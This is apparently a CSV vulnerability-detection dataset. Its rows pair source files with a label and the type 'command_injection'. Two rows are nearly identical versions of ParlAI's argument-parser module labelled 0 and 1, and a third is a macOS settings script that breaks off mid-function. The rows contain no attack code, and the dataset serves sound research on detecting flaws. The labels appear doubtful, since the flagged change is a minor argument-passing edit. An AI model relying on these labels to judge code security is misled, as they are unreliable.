,Unnamed: 0.1,id,code,label,vtype
0,142,601668d569e1276e0b8bf2bf8fb43e391e10d170,"parlai/core/params.py/n/n# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
""""""Provides an argument parser and a set of default command line options for
using the ParlAI package.
""""""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """"""From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """"""
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """"""Inverse of params.str2class().""""""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """"""If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    .""""""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f""parlai.zoo.{animal}""
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """"""Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """"""

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """"""Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """"""
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. ""qa_data_collection"" or ""model_evaluator""')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. ""babi:Task1"" or ""babi,cbt""')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add "":stream"" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is ""raw"". set to ""none"" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """"""Add arguments related to models such as model files.""""""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """"""Add arguments specific to a particular model.""""""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """"""Add arguments specific to the specified task.""""""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """"""Add additional arguments for handling images.""""""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """"""Add more args depending on how known args are set.""""""
        parsed = vars(self.parse_known_args(args, nohelp=True)[0])

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """"""Custom parse known args to ignore help flag.""""""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """"""Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """"""
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """"""Print out all the arguments in this parser.""""""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """"""Set overridable kwargs.""""""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v
/n/n/n",0,command_injection
1,143,601668d569e1276e0b8bf2bf8fb43e391e10d170,"/parlai/core/params.py/n/n# Copyright (c) 2017-present, Facebook, Inc.
# All rights reserved.
# This source code is licensed under the BSD-style license found in the
# LICENSE file in the root directory of this source tree. An additional grant
# of patent rights can be found in the PATENTS file in the same directory.
""""""Provides an argument parser and a set of default command line options for
using the ParlAI package.
""""""

import argparse
import importlib
import os
import sys
from parlai.core.agents import get_agent_module, get_task_module
from parlai.tasks.tasks import ids_to_tasks


def str2bool(value):
    v = value.lower()
    if v in ('yes', 'true', 't', '1', 'y'):
        return True
    elif v in ('no', 'false', 'f', 'n', '0'):
        return False
    else:
        raise argparse.ArgumentTypeError('Boolean value expected.')


def str2class(value):
    """"""From import path string, returns the class specified. For example, the
    string 'parlai.agents.drqa.drqa:SimpleDictionaryAgent' returns
    <class 'parlai.agents.drqa.drqa.SimpleDictionaryAgent'>.
    """"""
    if ':' not in value:
        raise RuntimeError('Use a colon before the name of the class.')
    name = value.split(':')
    module = importlib.import_module(name[0])
    return getattr(module, name[1])


def class2str(value):
    """"""Inverse of params.str2class().""""""
    s = str(value)
    s = s[s.find('\'') + 1:s.rfind('\'')]  # pull out import path
    s = ':'.join(s.rsplit('.', 1))  # replace last period with ':'
    return s


def modelzoo_path(datapath, path):
    """"""If path starts with 'models', then we remap it to the model zoo path
    within the data directory (default is ParlAI/data/models).
    .""""""
    if path is None:
        return None
    if not path.startswith('models:'):
        return path
    else:
        # Check if we need to download the model
        animal = path[7:path.rfind('/')].replace('/', '.')
        module_name = f""parlai.zoo.{animal}""
        print(module_name)
        try:
            my_module = importlib.import_module(module_name)
            download = getattr(my_module, 'download')
            download(datapath)
        except (ModuleNotFoundError, AttributeError):
            pass
        return os.path.join(datapath, 'models', path[7:])


class ParlaiParser(argparse.ArgumentParser):
    """"""Pseudo-extension of ``argparse`` which sets a number of parameters
    for the ParlAI framework. More options can be added specific to other
    modules by passing this object and calling ``add_arg()`` or
    ``add_argument()`` on it.

    For example, see ``parlai.core.dict.DictionaryAgent.add_cmdline_args``.
    """"""

    def __init__(self, add_parlai_args=True, add_model_args=False):
        """"""Initializes the ParlAI argparser.
        - add_parlai_args (default True) initializes the default arguments for
        ParlAI package, including the data download paths and task arguments.
        - add_model_args (default False) initializes the default arguments for
        loading models, including initializing arguments from that model.
        """"""
        super().__init__(description='ParlAI parser.', allow_abbrev=False,
                         conflict_handler='resolve')
        self.register('type', 'bool', str2bool)
        self.register('type', 'class', str2class)
        self.parlai_home = (os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.realpath(__file__)))))
        os.environ['PARLAI_HOME'] = self.parlai_home

        self.add_arg = self.add_argument

        # remember which args were specified on the command line
        self.cli_args = sys.argv
        self.overridable = {}

        if add_parlai_args:
            self.add_parlai_args()
        if add_model_args:
            self.add_model_args()

    def add_parlai_data_path(self, argument_group=None):
        if argument_group is None:
            argument_group = self
        default_data_path = os.path.join(self.parlai_home, 'data')
        argument_group.add_argument(
            '-dp', '--datapath', default=default_data_path,
            help='path to datasets, defaults to {parlai_dir}/data')

    def add_mturk_args(self):
        mturk = self.add_argument_group('Mechanical Turk')
        default_log_path = os.path.join(self.parlai_home, 'logs', 'mturk')
        mturk.add_argument(
            '--mturk-log-path', default=default_log_path,
            help='path to MTurk logs, defaults to {parlai_dir}/logs/mturk')
        mturk.add_argument(
            '-t', '--task',
            help='MTurk task, e.g. ""qa_data_collection"" or ""model_evaluator""')
        mturk.add_argument(
            '-nc', '--num-conversations', default=1, type=int,
            help='number of conversations you want to create for this task')
        mturk.add_argument(
            '--unique', dest='unique_worker', default=False,
            action='store_true',
            help='enforce that no worker can work on your task twice')
        mturk.add_argument(
            '--unique-qual-name', dest='unique_qual_name',
            default=None, type=str,
            help='qualification name to use for uniqueness between HITs')
        mturk.add_argument(
            '-r', '--reward', default=0.05, type=float,
            help='reward for each worker for finishing the conversation, '
                 'in US dollars')
        mturk.add_argument(
            '--sandbox', dest='is_sandbox', action='store_true',
            help='submit the HITs to MTurk sandbox site')
        mturk.add_argument(
            '--live', dest='is_sandbox', action='store_false',
            help='submit the HITs to MTurk live site')
        mturk.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        mturk.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        mturk.add_argument(
            '--hard-block', dest='hard_block', action='store_true',
            default=False,
            help='Hard block disconnecting Turkers from all of your HITs')
        mturk.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        mturk.add_argument(
            '--block-qualification', dest='block_qualification', default='',
            help='Qualification to use for soft blocking users. By default '
                 'turkers are never blocked, though setting this will allow '
                 'you to filter out turkers that have disconnected too many '
                 'times on previous HITs where this qualification was set.')
        mturk.add_argument(
            '--count-complete', dest='count_complete',
            default=False, action='store_true',
            help='continue until the requested number of conversations are '
                 'completed rather than attempted')
        mturk.add_argument(
            '--allowed-conversations', dest='allowed_conversations',
            default=0, type=int,
            help='number of concurrent conversations that one mturk worker '
                 'is able to be involved in, 0 is unlimited')
        mturk.add_argument(
            '--max-connections', dest='max_connections',
            default=30, type=int,
            help='number of HITs that can be launched at the same time, 0 is '
                 'unlimited.'
        )
        mturk.add_argument(
            '--min-messages', dest='min_messages',
            default=0, type=int,
            help='number of messages required to be sent by MTurk agent when '
                 'considering whether to approve a HIT in the event of a '
                 'partner disconnect. I.e. if the number of messages '
                 'exceeds this number, the turker can submit the HIT.'
        )
        mturk.add_argument(
            '--local', dest='local', default=False, action='store_true',
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        mturk.set_defaults(is_sandbox=True)
        mturk.set_defaults(is_debug=False)
        mturk.set_defaults(verbose=False)

    def add_messenger_args(self):
        messenger = self.add_argument_group('Facebook Messenger')
        messenger.add_argument(
            '--debug', dest='is_debug', action='store_true',
            help='print and log all server interactions and messages')
        messenger.add_argument(
            '--verbose', dest='verbose', action='store_true',
            help='print all messages sent to and from Turkers')
        messenger.add_argument(
            '--log-level', dest='log_level', type=int, default=20,
            help='importance level for what to put into the logs. the lower '
                 'the level the more that gets logged. values are 0-50')
        messenger.add_argument(
            '--force-page-token', dest='force_page_token', action='store_true',
            help='override the page token stored in the cache for a new one')
        messenger.add_argument(
            '--password', dest='password', type=str, default=None,
            help='Require a password for entry to the bot')
        messenger.add_argument(
            '--local', dest='local', action='store_true', default=False,
            help='Run the server locally on this server rather than setting up'
                 ' a heroku server.'
        )

        messenger.set_defaults(is_debug=False)
        messenger.set_defaults(verbose=False)

    def add_parlai_args(self, args=None):
        default_downloads_path = os.path.join(self.parlai_home, 'downloads')
        parlai = self.add_argument_group('Main ParlAI Arguments')
        parlai.add_argument(
            '-t', '--task',
            help='ParlAI task(s), e.g. ""babi:Task1"" or ""babi,cbt""')
        parlai.add_argument(
            '--download-path', default=default_downloads_path,
            help='path for non-data dependencies to store any needed files.'
                 'defaults to {parlai_dir}/downloads')
        parlai.add_argument(
            '-dt', '--datatype', default='train',
            choices=['train', 'train:stream', 'train:ordered',
                     'train:ordered:stream', 'train:stream:ordered',
                     'valid', 'valid:stream', 'test', 'test:stream'],
            help='choose from: train, train:ordered, valid, test. to stream '
                 'data add "":stream"" to any option (e.g., train:stream). '
                 'by default: train is random with replacement, '
                 'valid is ordered, test is ordered.')
        parlai.add_argument(
            '-im', '--image-mode', default='raw', type=str,
            help='image preprocessor to use. default is ""raw"". set to ""none"" '
                 'to skip image loading.')
        parlai.add_argument(
            '-nt', '--numthreads', default=1, type=int,
            help='number of threads. If batchsize set to 1, used for hogwild; '
                 'otherwise, used for number of threads in threadpool loading,'
                 ' e.g. in vqa')
        parlai.add_argument(
            '--hide-labels', default=False, type='bool',
            help='default (False) moves labels in valid and test sets to the '
                 'eval_labels field. If True, they are hidden completely.')
        batch = self.add_argument_group('Batching Arguments')
        batch.add_argument(
            '-bs', '--batchsize', default=1, type=int,
            help='batch size for minibatch training schemes')
        batch.add_argument('-bsrt', '--batch-sort', default=True, type='bool',
                           help='If enabled (default True), create batches by '
                                'flattening all episodes to have exactly one '
                                'utterance exchange and then sorting all the '
                                'examples according to their length. This '
                                'dramatically reduces the amount of padding '
                                'present after examples have been parsed, '
                                'speeding up training.')
        batch.add_argument('-clen', '--context-length', default=-1, type=int,
                           help='Number of past utterances to remember when '
                                'building flattened batches of data in multi-'
                                'example episodes.')
        batch.add_argument('-incl', '--include-labels',
                           default=True, type='bool',
                           help='Specifies whether or not to include labels '
                                'as past utterances when building flattened '
                                'batches of data in multi-example episodes.')
        self.add_parlai_data_path(parlai)

    def add_model_args(self):
        """"""Add arguments related to models such as model files.""""""
        model_args = self.add_argument_group('ParlAI Model Arguments')
        model_args.add_argument(
            '-m', '--model', default=None,
            help='the model class name. can match parlai/agents/<model> for '
                 'agents in that directory, or can provide a fully specified '
                 'module for `from X import Y` via `-m X:Y` '
                 '(e.g. `-m parlai.agents.seq2seq.seq2seq:Seq2SeqAgent`)')
        model_args.add_argument(
            '-mf', '--model-file', default=None,
            help='model file name for loading and saving models')
        model_args.add_argument(
            '--dict-class',
            help='the class of the dictionary agent uses')

    def add_model_subargs(self, model):
        """"""Add arguments specific to a particular model.""""""
        agent = get_agent_module(model)
        try:
            if hasattr(agent, 'add_cmdline_args'):
                agent.add_cmdline_args(self)
        except argparse.ArgumentError:
            # already added
            pass
        try:
            if hasattr(agent, 'dictionary_class'):
                s = class2str(agent.dictionary_class())
                self.set_defaults(dict_class=s)
        except argparse.ArgumentError:
            # already added
            pass

    def add_task_args(self, task):
        """"""Add arguments specific to the specified task.""""""
        for t in ids_to_tasks(task).split(','):
            agent = get_task_module(t)
            try:
                if hasattr(agent, 'add_cmdline_args'):
                    agent.add_cmdline_args(self)
            except argparse.ArgumentError:
                # already added
                pass

    def add_image_args(self, image_mode):
        """"""Add additional arguments for handling images.""""""
        try:
            parlai = self.add_argument_group('ParlAI Image Preprocessing Arguments')
            parlai.add_argument('--image-size', type=int, default=256,
                                help='resizing dimension for images')
            parlai.add_argument('--image-cropsize', type=int, default=224,
                                help='crop dimension for images')
        except argparse.ArgumentError:
            # already added
            pass


    def add_extra_args(self, args=None):
        """"""Add more args depending on how known args are set.""""""
        parsed = vars(self.parse_known_args(nohelp=True)[0])

        # find which image mode specified if any, and add additional arguments
        image_mode = parsed.get('image_mode', None)
        if image_mode is not None and image_mode != 'none':
            self.add_image_args(image_mode)

        # find which task specified if any, and add its specific arguments
        task = parsed.get('task', None)
        if task is not None:
            self.add_task_args(task)
        evaltask = parsed.get('evaltask', None)
        if evaltask is not None:
            self.add_task_args(evaltask)

        # find which model specified if any, and add its specific arguments
        model = parsed.get('model', None)
        if model is not None:
            self.add_model_subargs(model)

        # reset parser-level defaults over any model-level defaults
        try:
            self.set_defaults(**self._defaults)
        except AttributeError:
            raise RuntimeError('Please file an issue on github that argparse '
                               'got an attribute error when parsing.')


    def parse_known_args(self, args=None, namespace=None, nohelp=False):
        """"""Custom parse known args to ignore help flag.""""""
        if nohelp:
            # ignore help
            args = sys.argv[1:] if args is None else args
            args = [a for a in args if a != '-h' and a != '--help']
        return super().parse_known_args(args, namespace)


    def parse_args(self, args=None, namespace=None, print_args=True):
        """"""Parses the provided arguments and returns a dictionary of the
        ``args``. We specifically remove items with ``None`` as values in order
        to support the style ``opt.get(key, default)``, which would otherwise
        return ``None``.
        """"""
        self.add_extra_args(args)
        self.args = super().parse_args(args=args)
        self.opt = vars(self.args)

        # custom post-parsing
        self.opt['parlai_home'] = self.parlai_home
        if 'batchsize' in self.opt and self.opt['batchsize'] <= 1:
            # hide batch options
            self.opt.pop('batch_sort', None)
            self.opt.pop('context_length', None)

        # set environment variables
        if self.opt.get('download_path'):
            os.environ['PARLAI_DOWNPATH'] = self.opt['download_path']
        if self.opt.get('datapath'):
            os.environ['PARLAI_DATAPATH'] = self.opt['datapath']

        # map filenames that start with 'models:' to point to the model zoo dir
        if self.opt.get('model_file') is not None:
            self.opt['model_file'] = modelzoo_path(self.opt.get('datapath'),
                                                   self.opt['model_file'])
        if self.opt.get('dict_file') is not None:
            self.opt['dict_file'] = modelzoo_path(self.opt.get('datapath'),
                                                  self.opt['dict_file'])

        # set all arguments specified in commandline as overridable
        option_strings_dict = {}
        store_true = []
        store_false = []
        for group in self._action_groups:
            for a in group._group_actions:
                if hasattr(a, 'option_strings'):
                    for option in a.option_strings:
                        option_strings_dict[option] = a.dest
                        if '_StoreTrueAction' in str(type(a)):
                            store_true.append(option)
                        elif '_StoreFalseAction' in str(type(a)):
                            store_false.append(option)

        for i in range(len(self.cli_args)):
            if self.cli_args[i] in option_strings_dict:
                if self.cli_args[i] in store_true:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        True
                elif self.cli_args[i] in store_false:
                    self.overridable[option_strings_dict[self.cli_args[i]]] = \
                        False
                else:
                    if i < (len(self.cli_args) - 1) and \
                            self.cli_args[i+1][0] != '-':
                        self.overridable[option_strings_dict[self.cli_args[i]]] = \
                            self.cli_args[i+1]
        self.opt['override'] = self.overridable

        if print_args:
            self.print_args()

        return self.opt

    def print_args(self):
        """"""Print out all the arguments in this parser.""""""
        if not self.opt:
            self.parse_args(print_args=False)
        values = {}
        for key, value in self.opt.items():
            values[str(key)] = str(value)
        for group in self._action_groups:
            group_dict = {
                a.dest: getattr(self.args, a.dest, None)
                for a in group._group_actions
            }
            namespace = argparse.Namespace(**group_dict)
            count = 0
            for key in namespace.__dict__:
                if key in values:
                    if count == 0:
                        print('[ ' + group.title + ': ] ')
                    count += 1
                    print('[  ' + key + ': ' + values[key] + ' ]')

    def set_params(self, **kwargs):
        """"""Set overridable kwargs.""""""
        self.set_defaults(**kwargs)
        for k, v in kwargs.items():
            self.overridable[k] = v
/n/n/n",1,command_injection
2,24,bb2ded2dbbbac8966a77cc8aa227011a8b8772c0,"os-x-config/standard_tweaks/install_mac_tweaks.py/n/n#! /usr/bin/env python3
""""""
Set user settings to optimize performance, Finder and windowing features, and automate standard preference
settings.

While this is an Apple specific script, it doesn't check to see if it's executing on a Mac.
""""""

import dglogger
import argparse
import os
import getpass
import grp
import platform
import re
import pexpect
import shlex
import subprocess
import sys


def is_admin():
    """"""Check to see if the user belongs to the 'admin' group.

    :return: boolean
    """"""
    return os.getlogin() in grp.getgrnam('admin').gr_mem


def is_executable(tweak_group, groups, is_admin = is_admin()):
    """"""Determines if the tweak should be executed.

    :param tweak_group: tweak's group key value.
    :param groups: groups specified on the command line.
    :param is_admin: True if user belongs to 'admn' group.
    :rtype: boolean
    """"""
    # return True # for testing
    if groups is None and tweak_group != 'sudo':
        return True
    if groups is None and tweak_group == 'sudo' and is_admin:
        return True
    if groups is not None and tweak_group in groups and tweak_group != 'sudo':
        return True
    if groups is not None and tweak_group in groups and tweak_group == 'sudo' and is_admin:
        return True
    return False


def os_supported(min_v, max_v):
    """"""Checks to see if the preference is supported on your version of the Mac OS.
    NB: 10.9 is represented in the tweaks.py file as 10.09.

    :param min_v:
    :param max_v:
    :return: boolean
    """"""
    os_version = re.match('[0-9]+\.[0-9]+', platform.mac_ver()[0]).group(0)  # major.minor
    return not (os_version < str(min_v) or (max_v is not None and os_version > str(max_v)))


def run_batch_mode(tweaks, args):
    for t in tweaks:
        if os_supported(t['os_v_min'], t['os_v_max']) \
                and is_executable(t['group'], args.groups, is_admin()) \
                and t['group'] != 'test':
            run_command(t['set'])


def run_command(cmd):
    try:
        subprocess.run(shlex.split(cmd), shell=False, timeout=60, check=True)
        dglogger.log_info(str(cmd))
    except subprocess.CalledProcessError as e:
#        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_error(str(e)) # figure out deal w/file=sys.stderr!
    except subprocess.TimeoutExpired as e:
        dglogger.log_error(e, file=sys.stderr)
    except OSError as e:
